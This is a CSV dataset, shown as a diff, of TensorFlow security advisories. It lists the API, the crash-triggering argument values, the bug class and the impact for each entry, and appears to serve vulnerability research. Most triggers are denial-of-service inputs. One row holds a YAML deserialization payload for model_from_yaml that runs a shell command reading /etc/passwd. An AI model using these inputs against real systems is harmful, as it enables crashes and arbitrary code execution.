+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5wpj-c6f7-24x8,https://github.com/tensorflow/tensorflow/commit/dbdd98c37bc25249e8f288bd30d01e118a7b4498,tf.summary,tf.summary.flush,Empty input,writer=(),writer,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5v77-j66x-4c4g,https://github.com/tensorflow/tensorflow/commit/174c5096f303d5be7ed2ca2662b08371bff4ab88,tf.raw_ops,tf.raw_ops.Conv3DBackpropFilterV2,Rank other than 1,"filter_sizes=tf.constant(0, shape=[], dtype=tf.int32)",filter_sizes,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 2,"x=tf.constant(0.837607, shape=[28,29], dtype=tf.float32),",x,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 2,"cs_prev=tf.constant(0, shape=[28,17], dtype=tf.float32),",cs_prev,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 2,"h_prev=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),",h_prev,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 2,"w=tf.constant(0.887386262, shape=[46,68], dtype=tf.float32),",w,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 1,"wci=tf.constant(0, shape=[], dtype=tf.float32),",wci,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 1,"wcf=tf.constant(0, shape=[17], dtype=tf.float32),",wcf,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 1,"wco=tf.constant(0.592631638, shape=[28,17], dtype=tf.float32),",wco,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2vv3-56qg-g2cf,https://github.com/tensorflow/tensorflow/commit/803404044ae7a1efac48ba82d74111fce1ddb09a,tf.raw_ops,tf.raw_ops.LSTMBlockCell,Rank other than 1,"b=tf.constant(0.75259006, shape=[68], dtype=tf.float32),",b,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mg66-qvc5-rm93,https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11,tf.raw_ops,tf.raw_ops.SparseTensorToCSRSparseMatrix,Scalar input,"indices = tf.constant(53, shape=[3], dtype=tf.int64)",indices,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-mg66-qvc5-rm93,https://github.com/tensorflow/tensorflow/commit/ea50a40e84f6bff15a0912728e35b657548cef11,tf.raw_ops,tf.raw_ops.SparseTensorToCSRSparseMatrix,Scalar input,"values = tf.constant(0.554979503, shape=[218650], dtype=tf.float32)",dense_shape,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-p9rc-rmr5-529j,https://github.com/tensorflow/tensorflow/commit/3150642acbbe254e3c3c5d2232143fa591855ac9,tf.raw_ops,tf.raw_ops.LoadAndRemapMatrix,Rank other than 4,"initializing_values = tf.constant([], shape=[0, 1], dtype=tf.float32)",initializing_values ,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-hrg5-737c-2p56,https://github.com/tensorflow/tensorflow/commit/13d38a07ce9143e044aa737cfd7bb759d0e9b400,tf.raw_ops,tf.raw_ops.UnsortedSegmentJoin,Non scalar input,"num_segments=tf.constant(0, shape=[12], dtype=tf.int64))",num_segments,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h48f-q7rw-hvr7,https://github.com/tensorflow/tensorflow/commit/cebe3c45d76357d201c65bdbbf0dbe6e8a63bbdb,tf.raw_ops,tf.raw_ops.StagePeek,Non scalar input,"index = tf.constant([], shape=[0], dtype=tf.int32)",index,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-fv25-wrff-wf86,https://github.com/tensorflow/tensorflow/commit/48305e8ffe5246d67570b64096a96f8e315a7281,tf.raw_ops,tf.raw_ops.GetSessionTensor,Non scalar input,"handle = tf.constant(""[]"", shape=[0], dtype=tf.string)",handle,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h5g4-ppwx-48q2,https://github.com/tensorflow/tensorflow/commit/cff267650c6a1b266e4b4500f69fbc49cdd773c5,tf.raw_ops,tf.raw_ops.DeleteSessionTensor,Non scalar input,"handle = tf.constant(""[]"", shape=[0], dtype=tf.string)",,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-h2wq-prv9-2f56,https://github.com/tensorflow/tensorflow/commit/098e7762d909bac47ce1dbabe6dfd06294cb9d58,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV4Grad,Non scalar input,"input_min=tf.constant([], shape=[0], dtype=tf.float64),
+input_max=tf.constant(-10, shape=[], dtype=tf.float64),","input_min, input_max",N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2p9q-h29j-3f5v,https://github.com/tensorflow/tensorflow/commit/290bb05c80c327ed74fae1d089f1001b1e2a4ef7,tf.raw_ops,tf.raw_ops.TensorSummaryV2 ,Non scalar input, serialized_summary_metadata=tf.io.encode_base64(np.empty((0))),axis,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-43q8-3fv7-pr5x,https://github.com/tensorflow/tensorflow/commit/61bf91e768173b001d56923600b40d9a95a04ad5,tf.sparse,tf.sparse.split,Non scalar input,"axis = [1, 2]",axis,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x4qx-4fjv-hmw6,https://github.com/tensorflow/tensorflow/commit/6f4d3e8139ec724dbbcb40505891c81dd1052c4a,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Very large input argument,"dense_shape=[2 ** 31, 2 ** 32],",dense_shape,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3mw4-6rj6-74g5,https://github.com/tensorflow/tensorflow/commit/53b0dd6dc5957652f35964af16b892ec9af4a559,tf.raw_ops,tf.raw_ops.QuantizedMaxPool,Non scalar input,"min_input = [],max_input = [1],","min_input, max_input",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-87v6-crgm-2gfj,https://github.com/tensorflow/tensorflow/commit/ba4e8ac4dc2991e350d5cc407f8598c8d4ee70fb,tf.raw_ops,tf.raw_ops.FractionalMaxPool,Dimension mismatch,"pooling_ratio=[1.0, 1.44, 1.73, 1.0],",pooling_ratio,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6445-fm66-fvq2,https://github.com/tensorflow/tensorflow/commit/b51b82fe65ebace4475e3c54eb089c18a4403f1c,tf.raw_ops,tf.raw_ops.AddManySparseToTensorsMap,Dimension mismatch,"sparse_shape=[2**32,2**32],",,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrx2-r989-2c43,https://github.com/tensorflow/tensorflow/commit/1b54cadd19391b60b6fcccd8d076426f7221d5e8,tf.raw_ops,tf.raw_ops.SparseDenseCwiseDiv,Non vector input,"sp_shape=np.array([92233720368., 92233720368]),",sp_shape,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rrx2-r989-2c43,https://github.com/tensorflow/tensorflow/commit/1b54cadd19391b60b6fcccd8d076426f7221d5e8,tf.raw_ops,tf.raw_ops.SparseDenseCwiseDiv,Dimension mismatch,"sp_indices=np.array([[9]]),",sp_indices,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-98j8-c9q4-r38g,https://github.com/tensorflow/tensorflow/commit/f68fdab93fb7f4ddb4eb438c8fe052753c9413e8,tf.raw_ops,tf.raw_ops.StringNGrams,Negative argument,"pad_width=-5, ",pad_width,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c582-c96p-r5cq,https://github.com/tensorflow/tensorflow/commit/e3749a6d5d1e8d11806d4a2e9cc3123d1a90b75e,tf.raw_ops,tf.raw_ops.ThreadPoolHandle,Very large input argument,num_threads=0x60000000,num_threads,N.A,memory consumption,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m4hf-j54p-p353,https://github.com/tensorflow/tensorflow/commit/08d7b00c0a5a20926363849f611729f53f3ec022,tf.raw_ops,tf.raw_ops.ConcatV2,Very large input argument,axis = 0xb500005b,axis,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-34f9-hjfq-rr8j,https://github.com/tensorflow/tensorflow/commit/58b34c6c8250983948b5a781b426f6aa01fd47af,tf.raw_ops,tf.raw_ops.UnravelIndex,Very large input argument,"dims=[0x100000,0x100000]",dims,integer overflow,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vjg4-v33c-ggc4,https://github.com/tensorflow/tensorflow/commit/002408c3696b173863228223d535f9de72a101a9,tf.raw_ops,tf.raw_ops.FractionalAvgPoolGrad,Negative argument,"row_pooling_sequence=[-10,1,2,3],
+col_pooling_sequence=[1,2,3,4],","row_pooling_sequence, col_pooling_sequence",out of bound read,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-c6fh-56w7-fvjw,https://github.com/tensorflow/tensorflow/commit/b64638ec5ccaa77b7c1eb90958e3d85ce381f91b,tf.raw_ops,tf.raw_ops.Dequantize,Very large input argument,"axis=2**31-1,",axis,N.A,integer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-23hm-7w47-xw72,https://github.com/tensorflow/tensorflow/commit/23968a8bf65b009120c43b5ebcceaf52dbc9e943,tf.raw_ops,tf.raw_ops.Dequantize,Very large input argument,"axis=2**31-1,",axis,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-6gmv-pjp9-p8w8,https://github.com/tensorflow/tensorflow/commit/37c01fb5e25c3d80213060460196406c43d31995,tf.raw_ops,tf.raw_ops.ReverseSequence,Negative argument,batch_dim = -10,batch_dim,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v3f7-j968-4h5f,https://github.com/tensorflow/tensorflow/commit/3218043d6d3a019756607643cf65574fbfef5d7a,tf.raw_ops,tf.raw_ops.AvgPoolGrad,Negative argument,"strides=[1,1,1,0],",strides,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-rg3m-hqc5-344v,https://github.com/tensorflow/tensorflow/commit/67bfd9feeecfb3c61d80f0e46d89c170fbee682b,tf.raw_ops,tf.raw_ops.SparseFillEmptyRows,Dimension mismatch,"indices=[[0,0],[0,0],[0,0]],
+values=['sssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss'],","indices
+values",N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cpf4-wx82-gxp6,https://github.com/tensorflow/tensorflow/commit/25d622ffc432acc736b14ca3904177579e733cc6,tf.raw_ops,tf.raw_ops.SplitV,Negative argument,"size_splits=[-1, -2]",size_splits,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cpf4-wx82-gxp6,https://github.com/tensorflow/tensorflow/commit/25d622ffc432acc736b14ca3904177579e733cc6,tf.raw_ops,tf.raw_ops.SplitV,More than one value,"size_splits=[-1, -2]",size_splits,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cqv6-3phm-hcwx,https://github.com/tensorflow/tensorflow/commit/af5fcebb37c8b5d71c237f4e59c6477015c78ce6,tf.raw_ops,tf.raw_ops.CudnnRNNV3,Rank other than 3,"input=[0.1, 0.1],
+input_h=[0.5],","input
+input_h",heap buffer overflow,invalid memory access,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9crf-c6qr-r273,https://github.com/tensorflow/tensorflow/commit/a8ad3e5e79c75f36edb81e0ba3f3c0c5442aeddc,tf.raw_ops,tf.raw_ops.AllToAll,Zero argument,split_count=0,split_count,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gpfh-jvf9-7wg5,https://github.com/tensorflow/tensorflow/commit/ca38dab9d3ee66c5de06f11af9a4b1200da5ef75,tf.raw_ops,tf.raw_ops.CollectiveReduceV2,Dimension mismatch,"group_size=[-10, -10, -10],
+group_key=[-10, -10],","group_size
+group_key",N.A,memory leak,N.A
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-4f99-p9c2-3j8x,https://github.com/tensorflow/tensorflow/commit/e6cf28c72ba2eb949ca950d834dd6d66bb01cfae,tf.raw_ops,tf.raw_ops.SparseMatMul,Zero argument,"a=[[1.0,1.0,1.0]],
+b=[[],[],[]],","a
+b",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-3ff2-r28g-w7h9,https://github.com/tensorflow/tensorflow/commit/c79ba87153ee343401dbe9d1954d7f79e521eb14,tf.raw_ops,tf.raw_ops.Transpose,Negative argument,perm=[-10],perm,N.A,heap buffer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-x3v8-c8qx-3j3r,https://github.com/tensorflow/tensorflow/commit/d3738dd70f1c9ceb547258cbb82d853da8771850,tf.raw_ops,tf.raw_ops.DeserializeSparse,Scalar input,serialized_sparse=tf.data.experimental.to_variant(dataset),serialized_sparse,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vwhq-49r4-gj9v,https://github.com/tensorflow/tensorflow/commit/fa6b7782fbb14aa08d767bc799c531f5e1fb3bb8,tf.ragged,tf.ragged.cross,Rank other than 2,"[tf.ragged.constant([['1']]),'2']","[tf.ragged.constant([['1']]),'2']",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cvgx-3v3q-m36c,https://github.com/tensorflow/tensorflow/commit/a0d64445116c43cf46a5666bd4eee28e7a82f244,tf.raw_ops,tf.raw_ops.QuantizeV2,Argument less than 1,"axis=-100,",axis,N.A,heap buffer overflow,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-49rx-x2rw-pc6f,https://github.com/tensorflow/tensorflow/commit/7cf73a2274732c9d82af51c2bc2cf90d13cd7e6d,tf.raw_ops,tf.raw_ops.QuantizeAndDequantizeV4Grad,Argument less than 2,"axis=-100,",axis,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h,https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235,tf.raw_ops,tf.raw_ops.ParallelConcat,Rank less than 1,shape=0,shape,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m342-ff57-4jcc,https://github.com/tensorflow/tensorflow/commit/701cfaca222a82afbeeb17496bd718baa65a67d2,tf.raw_ops,tf.raw_ops.SparseCountSparseOutput,Rank other than 2,indices=[1],indices,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xrqm-fpgr-6hhx,https://github.com/tensorflow/tensorflow/commit/6d94002a09711d297dbba90390d5482b76113899,tf,tf.range,Very large input argument,start=-1e+38,start,N.A,overflow,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5hx2-qx8j-qjqm,https://github.com/tensorflow/tensorflow/commit/e5272d4204ff5b46136a1ef1204fc00597e21837,tf.keras.layers,tf.keras.layers.UpSampling2D,Very large input argument,"size=1610637938,",size,overflow,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2p25-55c9-h58q,https://github.com/tensorflow/tensorflow/commit/9294094df6fea79271778eb7e7ae1bad8b5ef98f,tf.keras.backend,tf.keras.backend.tile,Very large input argument,"n=[100000000,100000000, 100000000]",n,overflow,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-gh8h-7j2j-qv4f,https://github.com/tensorflow/tensorflow/commit/874bda09e6702cd50bac90b453b50bcc65b2769e,tf.summary,tf.summary.create_file_writer,Non scalar input,logdir='',"logdir
+flush_millis
+max_queue
+filename_suffix",N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m539-j985-hcr8,https://github.com/tensorflow/tensorflow/commit/12b1ff82b3f26ff8de17e58703231d5a02ef1b8b,tf.keras.layers,tf.keras.layers.MaxPooling3D,Zero argument,"pool_size = [2, 2, 0]",pool_size,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-m539-j985-hcr8,https://github.com/tensorflow/tensorflow/commit/12b1ff82b3f26ff8de17e58703231d5a02ef1b8b,tf.keras.layers,tf.keras.layers.MaxPooling3D,Negative argument,"pool_size = [2, 2, 0]",pool_size,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh,https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429,tf.math,tf.math.segment_max,Very large input argument,segment_ids=[1676240524292489355],segment_ids,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh,https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429,tf.math,tf.math.segment_min,Very large input argument,segment_ids=[1676240524292489355],segment_ids,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh,https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429,tf.math,tf.math.segment_mean,Very large input argument,segment_ids=[1676240524292489355],segment_ids,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh,https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429,tf.math,tf.math.segment_sum,Very large input argument,segment_ids=[1676240524292489355],segment_ids,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-cq76-mxrc-vchh,https://github.com/tensorflow/tensorflow/commit/e9c81c1e1a9cd8dd31f4e83676cab61b60658429,tf.math,tf.math.segment_prod,Very large input argument,segment_ids=[1676240524292489355],segment_ids,N.A,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-jwf9-w5xm-f437,https://github.com/tensorflow/tensorflow/commit/bb6a0383ed553c286f87ca88c207f6774d5c4a8f,tf.lite.Interpreter,tf.lite.Interpreter.set_tensor,Negative argument,"interpreter = tf.lite.Interpreter(model_content=tflite_model)
+interpreter.allocate_tensors()
+
+input_details = interpreter.get_input_details()
+output_details = interpreter.get_output_details()
+
+params_data = np.reshape(np.array([1], dtype=np.int64), newshape=(1,))
+indices_data = np.reshape(np.array(-10, dtype=np.int64), newshape=())
+interpreter.set_tensor(input_details[0]['index'], params_data)
+interpreter.set_tensor(input_details[1]['index'], indices_data)",indices_data,heap buffer overflow,check failure,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-r6jx-9g48-2r5r,https://github.com/tensorflow/tensorflow/commit/23d6383eb6c14084a8fc3bdf164043b974818012,tf.keras,tf.keras.models.model_from_yaml,YAML input,"payload = '''
+!!python/object/new:type
+args: ['z', !!python/tuple [], {'extend': !!python/name:exec }]
+listitems: ""__import__('os').system('cat /etc/passwd')""
+'''
+  
+models.model_from_yaml(payload)",payload,N.A,N.A,arbitrary code execution
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qfpc-5pjr-mh26,https://github.com/tensorflow/tensorflow/commit/da857cfa0fde8f79ad0afdbc94e88b5d4bbec764,tf.raw_ops,tf.raw_ops.Dequantize,Argument less than 1,"axis=-10,",axis,N.A,segfault,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-2mv3-49ww,https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4,tf.raw_ops,tf.raw_ops.Conv2D,Zero argument,"filter = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),",filter,division by zero,crash,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9c8h-2mv3-49ww,https://github.com/tensorflow/tensorflow/commit/8a793b5d7f59e37ac7f3cd0954a750a2fe76bad4,tf.raw_ops,tf.raw_ops.Conv2D,Zero argument,"input = tf.constant([], shape=[0, 0, 0, 0], dtype=tf.float32),",input,division by zero,crash,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v768-w7m9-2vmm,https://github.com/tensorflow/tensorflow/commit/578e634b4f1c1c684d4b4294f9e5281b2133b3ed,tf.raw_ops,tf.raw_ops.SparseFillEmptyRows,Empty input,"dense_shape = tf.constant([], shape=[0], dtype=tf.int64),",dense_shape,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7ghq-fvr3-pj2x,https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475,tf.raw_ops,tf.raw_ops.MaxPoolGrad,Empty input,"orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),",orig_input,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7ghq-fvr3-pj2x,https://github.com/tensorflow/tensorflow/commit/136b51f10903e044308cf77117c0ed9871350475,tf.raw_ops,tf.raw_ops.MaxPoolGrad,Rank other than 4,"orig_input = tf.constant([], shape=[3, 0, 0, 2], dtype=tf.float32),",,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-278g-rq84-9hmg,https://github.com/tensorflow/tensorflow/commit/d7de67733925de196ec8863a33445b73f9562d1d,tf.raw_ops,tf.raw_ops.MapStage,Empty input,"key=tf.constant([], shape=[0, 0, 0, 0], dtype=tf.int64),",key,N.A,check failure,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-5hj3-vjjf-f5m7,https://github.com/tensorflow/tensorflow/commit/a4e138660270e7599793fa438cd7b2fc2ce215a6,tf.raw_ops,tf.raw_ops.SdcaOptimizerV2,Dimension mismatch,"example_labels=[],",example_labels,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-qr82-2c78-4m8h,https://github.com/tensorflow/tensorflow/commit/532f5c5a547126c634fefd43bbad1dc6417678ac,tf.raw_ops,tf.raw_ops.MapPeek,Empty input,"indices=[],",indices,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9697-98pf-4rw7,https://github.com/tensorflow/tensorflow/commit/42459e4273c2e47a3232cc16c4f4fff3b3a35c38,tf.raw_ops,tf.raw_ops.UpperBound,Rank less than 2,"sorted_input=[1,2,3],",sorted_input,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-9697-98pf-4rw7,https://github.com/tensorflow/tensorflow/commit/42459e4273c2e47a3232cc16c4f4fff3b3a35c38,tf.raw_ops,tf.raw_ops.LowerBound,Rank less than 3,"sorted_input=[1,2,3],",sorted_input,N.A,out of bound read,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c,https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d,tf.raw_ops,tf.raw_ops.NonMaxSuppressionV5,Negative argument,"max_output_size=-1,",max_output_size,N.A,division by zero,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-vmjw-c2vp-p33c,https://github.com/tensorflow/tensorflow/commit/3a7362750d5c372420aa8f0caf7bf5b5c3d0f52d,tf.raw_ops,tf.raw_ops.CombinedNonMaxSuppression,Negative argument,"max_output_size=-1,",max_output_size,N.A,division by zero,crash
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-2wmv-37vq-52g5,https://github.com/tensorflow/tensorflow/commit/a776040a5e7ebf76eeb7eb923bf1ae417dd4d233,tf.raw_ops,tf.raw_ops.UnravelIndex,Zero element ,"dims=[1,0,2]",dimes,N.A,division by zero,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w74j-v8xh-3w5h,https://github.com/tensorflow/tensorflow/commit/2e0ee46f1a47675152d3d865797a18358881d7a6,tensorflow.python.ops,gen_string_ops.unicode_encode,Empty input,"input_splits=[],",input_splits,N.A,nullptr dereference,Denial of Service
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-w4xf-2pqw-5mq7,https://github.com/tensorflow/tensorflow/commit/be7a4de6adfbd303ce08be4332554dff70362612,tf.raw_ops,tf.raw_ops.RaggedTensorToVariant,Empty input,"rt_nested_splits=[],",rt_nested_splits,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Empty input,"input=[],",input,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Element mismatch,"input_min=[-100,-100,-100,-100,-100],
+input_max=[-100,-100,-100],","input_min
+input_max",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/9e62869465573cb2d9b5053f1fa02a81fce21d69,tf.raw_ops,tf.raw_ops.RequantizationRangePerChannel,Element mismatch,"input=[],
+input_min=[-100,-100,-100,-100,-100],","input
+input_min",N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Non scalar input,"requested_output_min=[-100,-100,-100,-100,-100],",requested_output_min,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Non scalar input,"requested_output_max=[],",requested_output_max,N.A,nullptr dereference,undefined behavior
+Tensorflow,https://github.com/tensorflow/tensorflow/security/advisories/GHSA-v82p-hv3v-p6qp,https://github.com/tensorflow/tensorflow/commit/203214568f5bc237603dbab6e1fd389f1572f5c9,tensorflow.python.ops,gen_math_ops.requantize_per_channel,Element mismatch,"input_min=[-100,-100,-100,-100,-100],
+input_max=[-100,-100,-100],","input_min
+input_max",N.A,nullptr dereference,undefined behavior
